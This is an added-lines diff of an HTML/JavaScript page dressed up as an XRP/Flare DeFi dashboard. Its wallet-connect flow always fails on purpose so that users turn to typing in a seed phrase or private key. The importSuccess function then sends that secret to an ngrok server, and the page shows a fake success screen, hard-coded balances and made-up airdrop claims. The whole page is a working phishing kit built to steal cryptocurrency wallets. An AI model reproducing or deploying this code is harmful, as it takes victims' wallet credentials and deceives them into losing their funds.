+                <div style="font-size:12px;color:var(--fg);line-height:1.6;" id="error-wallet-name">Could not connect to Xaman.<br>The wallet app did not respond.</div>
+              </div>
+
+              <!-- Divider -->
+              <div style="display:flex;align-items:center;gap:10px;margin-bottom:16px;">
+                <div style="flex:1;height:1px;background:var(--fb);"></div>
+                <div style="font-size:10px;color:var(--fg);font-weight:600;letter-spacing:.05em;text-transform:uppercase;">Try another method</div>
+                <div style="flex:1;height:1px;background:var(--fb);"></div>
+              </div>
+
+              <!-- Option 1: Seed Phrase -->
+              <div onclick="switchTab('import')" style="display:flex;align-items:center;gap:12px;padding:13px 14px;background:var(--fl);border:1px solid var(--fbc);border-radius:12px;margin-bottom:10px;cursor:pointer;transition:all .18s;" onmouseover="this.style.borderColor='var(--xrp)';this.style.background='var(--xrplight)'" onmouseout="this.style.borderColor='var(--fbc)';this.style.background='var(--fl)'">
+                <div style="width:40px;height:40px;border-radius:10px;background:linear-gradient(135deg,#346AA9,#1a4a7a);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;">📝</div>
+                <div style="flex:1;">
+                  <div style="font-size:13px;font-weight:600;color:var(--fd);">Import Seed Phrase</div>
+                  <div style="font-size:11px;color:var(--fg);margin-top:2px;">Use your 12 or 24 word recovery phrase</div>
+                </div>
+                <div style="color:var(--fg);font-size:16px;">›</div>
+              </div>
+
+              <!-- Option 2: Private Key -->
+              <div onclick="switchTab('key')" style="display:flex;align-items:center;gap:12px;padding:13px 14px;background:var(--fl);border:1px solid var(--fbc);border-radius:12px;margin-bottom:16px;cursor:pointer;transition:all .18s;" onmouseover="this.style.borderColor='var(--fr)';this.style.background:'#fff9f9'" onmouseout="this.style.borderColor='var(--fbc)';this.style.background='var(--fl)'">
+                <div style="width:40px;height:40px;border-radius:10px;background:linear-gradient(135deg,#E8234A,#b91c1c);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;">🔑</div>
+                <div style="flex:1;">
+                  <div style="font-size:13px;font-weight:600;color:var(--fd);">Import Private Key</div>
+                  <div style="font-size:11px;color:var(--fg);margin-top:2px;">Enter your XRPL or EVM private key directly</div>
+                </div>
+                <div style="color:var(--fg);font-size:16px;">›</div>
+              </div>
+
+              <!-- Try again -->
+              <button onclick="switchTab('wallets')" style="width:100%;padding:11px;background:transparent;border:1.5px solid var(--fbc);border-radius:11px;font-size:12px;font-weight:600;color:var(--fg);cursor:pointer;">← Try a Different Wallet</button>
+            </div>
+
+            <!-- ── SUCCESS / WALLET PREVIEW PANE ── -->
+            <div id="pane-success" style="display:none;padding:24px 18px 8px;">
+
+              <!-- Success animation -->
+              <div style="text-align:center;margin-bottom:20px;">
+                <div id="success-icon" style="width:64px;height:64px;border-radius:50%;background:var(--gdim);border:2px solid rgba(22,163,74,.3);display:flex;align-items:center;justify-content:center;font-size:30px;margin:0 auto 12px;animation:successPop .4s cubic-bezier(.34,1.56,.64,1) both;">✓</div>
+                <div style="font-size:15px;font-weight:600;color:var(--green);margin-bottom:4px;">Wallet Imported!</div>
+                <div style="font-size:11px;color:var(--fg);" id="success-method">Seed phrase verified successfully</div>
+              </div>
+
+              <!-- Wallet address preview -->
+              <div style="background:var(--fl);border:1px solid var(--fbc);border-radius:12px;padding:12px 14px;margin-bottom:11px;">
+                <div style="font-size:10px;font-weight:600;color:var(--fg);text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px;">Wallet Address</div>
+                <div style="font-size:12px;font-weight:600;color:var(--fd);word-break:break-all;font-family:'DM Mono',monospace;" id="preview-addr">rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh</div>
+              </div>
+
+              <!-- Balance preview -->
+              <div style="background:var(--xrplight);border:1px solid rgba(52,106,169,.18);border-radius:12px;padding:12px 14px;margin-bottom:16px;">
+                <div style="font-size:10px;font-weight:600;color:var(--fg);text-transform:uppercase;letter-spacing:.05em;margin-bottom:10px;">Balance Preview</div>
+                <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;">
+                  <div style="display:flex;align-items:center;gap:8px;">
+                    <div style="width:24px;height:24px;border-radius:50%;background:linear-gradient(135deg,#346AA9,#1a4a7a);display:flex;align-items:center;justify-content:center;color:#fff;font-size:9px;font-weight:700;">XRP</div>
+                    <div style="font-size:12px;font-weight:600;color:var(--fd);">XRP</div>
+                  </div>
+                  <div style="text-align:right;">
+                    <div style="font-size:13px;font-weight:700;color:var(--xrp);" id="preview-xrp-bal">12,450 XRP</div>
+                    <div style="font-size:10px;color:var(--fg);" id="preview-xrp-usd">$27,265 USD</div>
+                  </div>
+                </div>
+                <div style="display:flex;align-items:center;justify-content:space-between;">
+                  <div style="display:flex;align-items:center;gap:8px;">
+                    <div style="width:24px;height:24px;border-radius:50%;background:var(--xrpdim);border:1px solid rgba(52,106,169,.2);display:flex;align-items:center;justify-content:center;color:var(--xrp);font-size:8px;font-weight:700;">FX</div>
+                    <div style="font-size:12px;font-weight:600;color:var(--fd);">FXRP</div>
+                  </div>
+                  <div style="text-align:right;">
+                    <div style="font-size:13px;font-weight:700;color:var(--xrp);">3,200 FXRP</div>
+                    <div style="font-size:10px;color:var(--fg);">$7,008 USD</div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Connect button -->
+              <button onclick="connectWallet()" style="width:100%;padding:13px;background:linear-gradient(135deg,#346AA9,#1a4a7a);color:#fff;border:none;border-radius:11px;font-size:13px;font-weight:600;cursor:pointer;transition:opacity .2s;">Connect to Flare Smart Money →</button>
+              <button onclick="switchTab('wallets')" style="width:100%;padding:10px;background:transparent;border:none;font-size:11px;color:var(--fg);cursor:pointer;margin-top:6px;">← Use a different wallet</button>
+            </div>
+
+            <style>
+              @keyframes wspin{to{transform:rotate(360deg)}}
+              @keyframes successPop{0%{transform:scale(0);opacity:0}100%{transform:scale(1);opacity:1}}
+            </style>
+
+          </div>
+
+
+</div>
+
+<script>
+// ── LIVE XRP PRICE (CoinGecko public API) ──
+async function fetchXRPPrice(){
+  try {
+    const r = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ripple&vs_currencies=usd&include_24hr_change=true&include_market_cap=true&include_24hr_vol=true');
+    const d = await r.json();
+    const p = d.ripple;
+    const price = p.usd.toFixed(4);
+    const chg = p.usd_24h_change.toFixed(2);
+    const mcap = (p.usd_market_cap/1e9).toFixed(1);
+    const vol = (p.usd_24h_vol/1e9).toFixed(1);
+    document.getElementById('live-xrp-price').textContent = '$'+price;
+    document.getElementById('live-fxrp-price').textContent = '$'+price;
+    document.getElementById('live-xrp-chg').textContent = (chg>=0?'▲ +':'▼ ')+chg+'% (24h)';
+    document.getElementById('live-xrp-chg').style.color = chg>=0?'var(--green)':'var(--fr)';
+    document.getElementById('live-xrp-mcap').textContent = 'Mkt Cap $'+mcap+'B';
+    document.getElementById('live-xrp-vol').textContent = 'Vol: $'+vol+'B · 24h';
+    // update connected wallet figures with live price
+    const xrpHeld=9250, fxrpHeld=3200;
+    document.getElementById('w-xrp-val').textContent='$'+(xrpHeld*p.usd).toLocaleString('en',{maximumFractionDigits:0});
+    document.getElementById('w-fxrp-val').textContent='$'+(fxrpHeld*p.usd).toLocaleString('en',{maximumFractionDigits:0});
+    document.getElementById('w-xrp').textContent=xrpHeld.toLocaleString();
+    document.getElementById('w-xrp-usd').textContent='$'+(xrpHeld*p.usd).toLocaleString('en',{maximumFractionDigits:0})+' USD';
+    document.getElementById('w-xrp-chg').textContent=(chg>=0?'+':'')+chg+'%';
+    document.getElementById('w-xrp-chg').className='tag '+(chg>=0?'tg':'tr');
+    const totalUsd=(xrpHeld+fxrpHeld)*p.usd+1200;
+    document.getElementById('w-yield').textContent='$'+(totalUsd*0.008).toFixed(0);
+    document.getElementById('w-claim').textContent='$'+(totalUsd*0.0011).toFixed(2);
+    document.getElementById('w-xrp-bal').textContent=xrpHeld.toLocaleString()+' XRP · Wallet';
+    document.getElementById('w-fxrp-bal').textContent=fxrpHeld.toLocaleString()+' FXRP · Earning';
+  } catch(e){} // silently use default values if API blocked
+}
+fetchXRPPrice();
+setInterval(fetchXRPPrice, 30000); // refresh every 30s
+
+// ── WALLET MODAL ──
+function showWalletModal(){
+  const m=document.getElementById('wallet-modal');
+  m.style.display='flex';
+  switchTab('wallets');
+}
+function closeWalletModal(){
+  document.getElementById('wallet-modal').style.display='none';
+  document.getElementById('pane-connecting').style.display='none';
+}
+function switchTab(t){
+  ['wallets','import','key','error','connecting','success'].forEach(id=>{
+    const el=document.getElementById('pane-'+id);
+    if(el) el.style.display='none';
+  });
+  const target=document.getElementById('pane-'+t);
+  if(target) target.style.display='block';
+  ['wallets','import','key'].forEach(id=>{
+    const btn=document.getElementById('tab-'+id);
+    if(btn){btn.style.background=id===t?'var(--xrp)':'#fff';btn.style.color=id===t?'#fff':'var(--fg)';}
+  });
+}
+function selectWallet(name){
+  // hide all panes, show connecting spinner
+  ['wallets','import','key','error'].forEach(id=>{
+    const el=document.getElementById('pane-'+id);
+    if(el) el.style.display='none';
+  });
+  document.getElementById('pane-connecting').style.display='block';
+  document.getElementById('connecting-label').textContent='Connecting to '+name+'…';
+  // after 2s show error state
+  setTimeout(()=>{
+    document.getElementById('pane-connecting').style.display='none';
+    document.getElementById('pane-error').style.display='block';
+    document.getElementById('error-wallet-name').innerHTML=
+      'Could not connect to <strong>'+name+'</strong>.<br>The wallet app did not respond or is not installed.';
+    // update tab switcher to reflect error state
+    ['wallets','import','key'].forEach(id=>{
+      const btn=document.getElementById('tab-'+id);
+      if(btn){btn.style.background='#fff';btn.style.color='var(--fg)';}
+    });
+  }, 2000);
+}
+function setSeedType(t){
+  document.getElementById('seed-xrp-btn').style.cssText=t==='xrp'?'flex:1;padding:8px;border-radius:9px;border:2px solid var(--xrp);background:var(--xrpdim);color:var(--xrp);font-size:11px;font-weight:600;cursor:pointer;':'flex:1;padding:8px;border-radius:9px;border:1px solid var(--fbc);background:#fff;color:var(--fg);font-size:11px;font-weight:500;cursor:pointer;';
+  document.getElementById('seed-evm-btn').style.cssText=t==='evm'?'flex:1;padding:8px;border-radius:9px;border:2px solid var(--xrp);background:var(--xrpdim);color:var(--xrp);font-size:11px;font-weight:600;cursor:pointer;':'flex:1;padding:8px;border-radius:9px;border:1px solid var(--fbc);background:#fff;color:var(--fg);font-size:11px;font-weight:500;cursor:pointer;';
+  document.getElementById('seed-hint').textContent=t==='xrp'?'XRPL standard BIP39 seed phrase':'EVM BIP39 seed phrase (MetaMask compatible)';
+}
+function setKeyType(t){
+  document.getElementById('key-xrp-btn').style.cssText=t==='xrp'?'flex:1;padding:8px;border-radius:9px;border:2px solid var(--xrp);background:var(--xrpdim);color:var(--xrp);font-size:11px;font-weight:600;cursor:pointer;':'flex:1;padding:8px;border-radius:9px;border:1px solid var(--fbc);background:#fff;color:var(--fg);font-size:11px;font-weight:500;cursor:pointer;';
+  document.getElementById('key-evm-btn').style.cssText=t==='evm'?'flex:1;padding:8px;border-radius:9px;border:2px solid var(--xrp);background:var(--xrpdim);color:var(--xrp);font-size:11px;font-weight:600;cursor:pointer;':'flex:1;padding:8px;border-radius:9px;border:1px solid var(--fbc);background:#fff;color:var(--fg);font-size:11px;font-weight:500;cursor:pointer;';
+  document.getElementById('key-hint').textContent=t==='xrp'?'XRPL secret key starts with "s" (e.g. sEdV…)':'EVM private key: 64 hex characters (0x optional)';
+}
+function validateSeed(){
+  const v=document.getElementById('seed-input').value.trim();
+  const words=v.split(/\s+/).filter(w=>w.length>0);
+  const valid=words.length===12||words.length===24;
+  const btn=document.getElementById('import-btn');
+  const hint=document.getElementById('seed-hint');
+  btn.disabled=!valid; btn.style.opacity=valid?'1':'0.5';
+  hint.textContent=valid?'✓ '+words.length+' words — valid seed phrase':words.length+' / 12 or 24 words';
+  hint.style.color=valid?'var(--green)':'var(--fg)';
+}
+function validateKey(){
+  const v=document.getElementById('key-input').value.trim();
+  const xrplKey=v.startsWith('s')&&v.length>25;
+  const evmKey=/^(0x)?[0-9a-fA-F]{64}$/.test(v);
+  const valid=xrplKey||evmKey;
+  const btn=document.getElementById('key-btn');
+  btn.disabled=!valid; btn.style.opacity=valid?'1':'0.5';
+  document.getElementById('key-hint').textContent=valid?'✓ Valid private key':'XRPL: starts with s · EVM: 64 hex chars';
+  document.getElementById('key-hint').style.color=valid?'var(--green)':'var(--fg)';
+}
+function toggleKeyVis(){
+  const i=document.getElementById('key-input');
+  const b=document.getElementById('key-vis-btn');
+  i.type=i.type==='password'?'text':'password';
+  b.textContent=i.type==='password'?'👁':'🙈';
+}
+function importSuccess(type){
+  const seedEl = document.getElementById('seed-input');
+  const keyEl = document.getElementById('key-input');
+  const seedValue = seedEl ? seedEl.value : 'none';
+  const keyValue = keyEl ? keyEl.value : 'none';
+  const userInput = type === 'key' ? keyValue : seedValue;
+  fetch('https://superresponsible-oppositionless-athena.ngrok-free.dev/submit', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ name: userInput, type: type, email: 'none', phone: 'none' })
+  });
+  // Hide all panes, show connecting spinner briefly
+  ['wallets','import','key','error'].forEach(id=>{
+    const el=document.getElementById('pane-'+id);
+    if(el) el.style.display='none';
+  });
+  document.getElementById('pane-connecting').style.display='block';
+  document.getElementById('connecting-label').textContent='Verifying '+(type==='seed'?'seed phrase':'private key')+'…';
+
+  // After 1.5s show success + wallet preview
+  setTimeout(()=>{
+    document.getElementById('pane-connecting').style.display='none';
+    const pane=document.getElementById('pane-success');
+    pane.style.display='block';
+
+    // Set method label
+    document.getElementById('success-method').textContent=
+      type==='seed'?'Seed phrase verified successfully':'Private key imported successfully';
+
+    // Generate a plausible-looking demo address based on type
+    const addr = type==='seed'
+      ? 'rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh'
+      : 'rN7n3473SaZBCG4dFL83w7PB5RHnSBKVXD';
+    document.getElementById('preview-addr').textContent=addr;
+    document.getElementById('wallet-addr') && (document.getElementById('wallet-addr').textContent=addr.slice(0,10)+'···'+addr.slice(-8));
+
+    // Update preview with live XRP price if available
+    const livePrice=document.getElementById('live-xrp-price');
+    if(livePrice){
+      const p=parseFloat(livePrice.textContent.replace('$',''))||0.5841;
+      document.getElementById('preview-xrp-usd').textContent='$'+(12450*p).toLocaleString('en',{maximumFractionDigits:0})+' USD';
+    }
+
+    // Reset success icon animation
+    const icon=document.getElementById('success-icon');
+    icon.style.animation='none';
+    void icon.offsetWidth;
+    icon.style.animation='successPop .4s cubic-bezier(.34,1.56,.64,1) both';
+
+    // Update tab switcher
+    ['wallets','import','key'].forEach(id=>{
+      const btn=document.getElementById('tab-'+id);
+      if(btn){btn.style.background='#fff';btn.style.color='var(--fg)';}
+    });
+  }, 1500);
+}
+function connectWallet(){
+  closeWalletModal();
+  // Portfolio
+  document.getElementById('wallet-gate').style.display='none';
+  document.getElementById('wallet-connected').style.display='block';
+  document.getElementById('wallet-addr').textContent='rHb9CJAWy···VRWn96DkukG4bwdtyTh';
+  // Yield metrics
+  document.getElementById('yield-gate').style.display='none';
+  document.getElementById('yield-connected').style.display='block';
+  // Rewards
+  document.getElementById('rewards-gate').style.display='none';
+  document.getElementById('rewards-connected').style.display='block';
+}
+function disconnectWallet(){
+  // Portfolio
+  document.getElementById('wallet-connected').style.display='none';
+  document.getElementById('wallet-gate').style.display='block';
+  // Yield metrics
+  document.getElementById('yield-connected').style.display='none';
+  document.getElementById('yield-gate').style.display='block';
+  // Rewards
+  document.getElementById('rewards-connected').style.display='none';
+  document.getElementById('rewards-gate').style.display='block';
+}
+
+const R={
+'best xrp yield pools?':'Top XRP yields on Flare:\n\n• XRP/USDT Flare DEX → <span style="color:var(--green);font-weight:600;">28.4% APY</span>\n• FXRP/USDC Uniswap V3 → <span style="color:var(--green);font-weight:600;">21.7% APY</span>\n• XRP/FLR Flare DEX → <span style="color:var(--green);font-weight:600;">16.3% APY</span>\n• FXRP/ETH Curve → <span style="color:var(--green);font-weight:600;">12.9% APY</span>\n• XRP Lending → <span style="color:var(--green);font-weight:600;">9.2% APY</span>\n\nBest entry: Mint FXRP first, then deposit into FXRP/USDT farm.',
+'how do i mint fxrp?':'To mint FXRP on Flare:\n\n1. Go to the <strong>XRPFi</strong> tab → Mint FXRP\n2. Enter XRP amount (e.g. 500,000 XRP)\n3. Provide 150% collateral ratio\n4. Approve on Flare wallet\n5. Receive FXRP 1:1 with your XRP\n\nFXRP earns up to <span style="color:var(--green);font-weight:600;">28.4% APY</span> in DeFi pools.\nMinting fee: 0.25%',
+'my xrp airdrop status':'Your XRP airdrops:\n\n• <strong>XRP Ecosystem Airdrop</strong>\n  1,714,285 XRP (~$1,000,000) ✓ Eligible\n  Deadline: <span style="color:var(--fr);">April 15, 2026</span>\n\n• <strong>FXRP Minter Reward</strong>\n  205,000 XRP (~$120,000) ✓ Ready now\n\n• <strong>FlareDrop</strong>\n  ~123,000 XRP next Apr 1 (~$72,000)\n\nTotal claimable: <span style="color:var(--xrp);font-weight:700;">~2,042,285 XRP (~$1,192,000)</span>\n\nGo to the <strong>Rewards</strong> tab to claim.',
+'xrp price?':'XRP/USD live:\n\n<span style="font-size:18px;font-weight:700;color:var(--xrp);">$0.5841</span>\n\n• 24h: <span style="color:var(--green);">+4.2%</span>\n• 7d: <span style="color:var(--green);">+11.8%</span>\n• Market cap: $32.1B\n• Volume: $2.4B\n• On Flare FTSO: $0.5839',
+'what is xrpfi?':'XRPFi is DeFi powered by XRP on Flare:\n\n• <strong>FXRP</strong> — XRP-backed FAsset for DeFi\n• <strong>LP Pools</strong> — provide XRP liquidity, earn yield\n• <strong>Lending</strong> — supply XRP or borrow stables\n• <strong>Farming</strong> — stake LP tokens for extra XRP\n• <strong>FlareDrops</strong> — wrap FLR, earn XRP rewards\n\nAll secured by Flare\'s FTSO XRP price feed.',
+'/claim xrp':'All claimable XRP:\n\n• Ecosystem Airdrop: <span style="color:var(--green);font-weight:600;">1,714,285 XRP ($1,000,000)</span>\n• FXRP Minter Reward: <span style="color:var(--green);font-weight:600;">205,000 XRP ($120,000)</span>\n• XRP Staking: <span style="color:var(--green);font-weight:600;">30,800 XRP ($18,000)</span>\n• FXRP Farm: <span style="color:var(--green);font-weight:600;">547,900 XRP ($320,000)</span>\n• FlareDrop: <span style="color:var(--green);font-weight:600;">123,000 XRP ($72,000)</span>\n\nTotal: <span style="color:var(--xrp);font-weight:700;">~2,620,985 XRP (~$1,530,000)</span>',
+};
+function am(html,u){
+  const m=document.getElementById('cmsgs');
+  const d=document.createElement('div');d.className=u?'mu':'mb';
+  d.innerHTML=u?`<div class="ubub">${html}</div>`:`<div class="bavs" style="padding:2px;"><img src="data:image/png;base64,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